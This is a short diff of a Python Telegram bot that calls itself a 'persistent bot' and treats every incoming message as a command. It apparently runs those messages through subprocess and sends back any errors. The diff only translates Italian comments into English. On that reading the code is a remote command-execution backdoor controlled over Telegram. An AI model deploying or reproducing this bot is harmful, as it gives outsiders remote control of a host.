@@ -11,12 +11,12 @@ import subprocess
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
-# Gestisci il comando /start
+# run with /start
 @bot.message_handler(commands=['start'])
 def handle_start(message):
     bot.reply_to(message, "Hello world! I'm your persistent bot, give an order")
 
-# Gestisci comandi inviati dall'utente
+# Command executed
 @bot.message_handler(func=lambda message: True)
 def handle_command(message):
     command = message.text
@@ -28,5 +28,5 @@ def handle_command(message):
     except Exception as e:
         bot.send_message(CHAT_ID, f"Error: {str(e)}")
 
-# Avvia il bot
+# Run bot
 bot.polling()
